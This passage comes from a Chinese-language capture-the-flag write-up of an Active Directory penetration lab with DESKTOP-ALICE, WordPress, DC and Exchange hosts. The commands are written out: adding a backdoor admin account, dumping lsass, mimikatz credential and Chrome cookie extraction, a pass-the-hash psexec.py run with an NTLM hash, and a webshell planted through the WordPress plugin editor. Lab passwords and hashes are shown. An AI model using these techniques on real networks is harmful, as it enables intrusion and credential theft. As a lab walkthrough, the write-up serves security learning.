    TCP 10.10.1.231:1433 10.10.1.234:49410 ESTABLISHED 1304
    TCP 10.10.1.231:1433 10.10.1.234:49411 ESTABLISHED 1304
    TCP 10.10.1.231:1433 10.10.1.234:49412 ESTABLISHED 1304
    TCP 10.10.1.231:1433 10.10.1.234:49413 ESTABLISHED 1304
    TCP 10.10.1.231:1433 10.10.1.234:49414 ESTABLISHED 1304
    TCP 10.10.1.231:1433 10.10.1.234:49417 ESTABLISHED 1304
    TCP 127.0.0.1:49192 127.0.0.1:49193 ESTABLISHED 1604
    TCP 127.0.0.1:49193 127.0.0.1:49192 ESTABLISHED 1604
    TCP 127.0.0.1:49194 0.0.0.0:0 LISTENING 1604
    TCP 127.0.0.1:49195 127.0.0.1:49196 ESTABLISHED 1604
    TCP 127.0.0.1:49196 127.0.0.1:49195 ESTABLISHED 1604
    TCP 127.0.0.1:49220 127.0.0.1:49221 ESTABLISHED 3744
    TCP 127.0.0.1:49221 127.0.0.1:49220 ESTABLISHED 3744
    TCP 127.0.0.1:49226 127.0.0.1:49227 ESTABLISHED 1604
    TCP 127.0.0.1:49227 127.0.0.1:49226 ESTABLISHED 1604
    TCP [::]:80 [::]:0 LISTENING 4
    TCP [::]:135 [::]:0 LISTENING 796
    TCP [::]:445 [::]:0 LISTENING 4
    TCP [::]:1433 [::]:0 LISTENING 1304
    TCP [::]:3389 [::]:0 LISTENING 1388
    TCP [::]:5985 [::]:0 LISTENING 4
    TCP [::]:47001 [::]:0 LISTENING 4
    TCP [::]:49152 [::]:0 LISTENING 524
    TCP [::]:49153 [::]:0 LISTENING 872
    TCP [::]:49154 [::]:0 LISTENING 928
    TCP [::]:49155 [::]:0 LISTENING 636
    TCP [::]:49177 [::]:0 LISTENING 620
    TCP [::]:49182 [::]:0 LISTENING 636
    TCP [::]:49238 [::]:0 LISTENING 1304
    UDP 0.0.0.0:123 *:* 1000
    UDP 0.0.0.0:500 *:* 928
    UDP 0.0.0.0:3389 *:* 1388
    UDP 0.0.0.0:4500 *:* 928
    UDP 0.0.0.0:5355 *:* 520
    UDP 0.0.0.0:64354 *:* 520
    UDP 10.10.1.231:137 *:* 4
    UDP 10.10.1.231:138 *:* 4
    UDP 127.0.0.1:50457 *:* 2964
    UDP 127.0.0.1:53687 *:* 2964
    UDP 127.0.0.1:56295 *:* 928
    UDP 127.0.0.1:59110 *:* 2964
    UDP 127.0.0.1:61057 *:* 520
    UDP 127.0.0.1:61059 *:* 636
    UDP 127.0.0.1:61187 *:* 2964
    UDP [::]:123 *:* 1000
    UDP [::]:500 *:* 928
    UDP [::]:3389 *:* 1388
    UDP [::]:4500 *:* 928
    UDP [::]:5355 *:* 520
    UDP [::]:64354 *:* 520
为了方便，先加个用户，然后 rdp 上去看看。
    net user /add root test456123!
    net localgroup administrators root /add
尝试创建 `lsass.exe` 的转储文件，然而刚点就被掐掉了。
（此处好想把卡巴斯基退出
> 根据官方题解的话，这里的 `DozerOCS.exe` 是 Alice 用户（也就是下文中 wordpress 的用户）起的，应该是 dump 这个的
>
> ~~然而咱复现的时候 tasklist 里没这个玩意啊……~~ （应该是被之前进来的师傅们日坏了 Orz
>
> 后来环境又重置了一次，这回有了，上面说的 tasklist 已经改成新的了。
>
>
> 
创建转储文件。
这里直接借助 234 机器上的木马，把 dmp 传到 234 机器上，本地再拖回来。
> 这里上传的时候发现直接上传会报错，压缩之后就没事了。
>
> 其实更好的方案比如用 powershell 起个 web 服务，或者把文件通过命令行 post 到其他机器上，再或者用 `net use` 拖回来？
    strings DozerOCS.DMP | grep ldap
得到 Alice 的用户信息。
    ldap://dc01.dozer.org:389|CN=AliceAlc,CN=Users,DC=dozer,DC=org|FkuWvj08
密码 `FkuWvj08`
另外，由于没做免杀，这台机器上 msf 木马被杀了（（之后有机会再研究研究免杀吧
## 0x04 10.10.1.121 DESKTOP-ALICE
盲猜用户名 `Alice`，利用上面得到的密码登录 DESKTOP-ALICE。
这台也在域里。
桌面上得到 flag。
同样，上线 msf
看了一下这台上面也没有域管的 hash。
## 0x05 10.10.1.250 WordPress
管理员用户名为 `alice`
看看 121 机器中 Chrome 的 Cookie：
`C:\Users\ALICE\AppData\Local\Google\Chrome\User Data\Default\Cookies`
整个 mimikatz 获取一下 Cookie。
    dpapi::chrome /in:"C:\Users\ALICE\AppData\Local\Google\Chrome\User Data\Default\Cookies" /unprotect
然而发现复现的时候环境被破坏掉了……（喵呜！
顺便也在上面看到了之前师傅进来用 `hack-browser-data.exe` 导出的浏览器数据，然而也没用来登录的 cookie 了……
另外还发现了用户名和密码。
    UserName,Password,LoginUrl,CreateDate
    Alice,Alice@Dozer@2021,http://10.10.1.250,2021-05-27T22:57:09+08:00
登录进来了。
版本号 WordPress 5.2
插件管理器里加个一句话木马。
flag 在 wordpress 用户桌面。
顺便上线 msf。
## 0x06 10.10.1.1 DC
在 250 机器上把内存中的登录信息 dump 出来。
或者上去用 mimikatz 执行，再或者把 `lsass.exe` dump 下来拖回本地再提取也行。
    # 直接在机器上抓取
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
    # 拉回本地处理
    mimikatz.exe "sekurlsa::minidump lsass.dmp"
    sekurlsa::logonpasswords
    Authentication Id : 0 ; 27358144 (00000000:01a173c0)
    Session           : Interactive from 4
    User Name         : DWM-4
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2021/5/31 14:34:20
    SID               : S-1-5-90-4
            msv :
             [00000003] Primary
             * Username : WEB02$
             * Domain   : DOZER
             * NTLM     : b943c070d6b172a110ac4a7a02cb0995
             * SHA1     : 5974013dfc3df4584e32d923dcb67a36236926ee
            tspkg :
            wdigest :
             * Username : WEB02$
             * Domain   : DOZER
             * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA% 可以参考 [Impacket 网络协议工具包介绍](https://www.freebuf.com/sectool/175208.html)
    psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9912e73b8ee265638b43d105fdb4c6f4 dozer/Administrator@10.10.1.1
乱码的话先指定一下编码 `chcp 65001`，使用 UTF-8 编码。
在桌面上拿到 flag。
mimikatz 抓取密码。
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
得到 Administrator 明文密码 `Admin890...`
同时也发现了个 flag 用户。
## 0x07 10.10.1.100 Exchange
利用`DOZER\WEB02$` 用户信息通过 ADExplorer64 连接到域控 10.10.1.1，可以查看一下域内信息。
里面看到了个 flag 用户。
（实际上域内的用户都能连接域控，查看域内的信息……之前的 Alice 也可以。
用域管的 Administrator 登录 
里面有个草稿提示了 flag 需要在 Dozerflagflag（也就是 PI:EMAIL ）用户里找。和上面的发现相照应了。
按照官方 writeup 里的说法，首先利用域管 Administrator 登录 Exchange 管理中心，即
然后给 flag 用户设置邮箱委托，把 Administrator 用户加进去。
然后访问 `https://10.10.1.100/owa/PI:EMAIL/` 即可查看 flag 用户的邮件，从而拿到 flag。
## 0x08 小结
第一次打域渗透的题目，好爽啊！
感谢主办方搭建的域环境，让喵喵有机会好好玩了一波！
明年有机会再来玩 qwq！
师傅们欢迎来 [咱博客](https://miaotony.xyz/?from=xianzhi) 逛逛喵~
_（溜了溜了喵_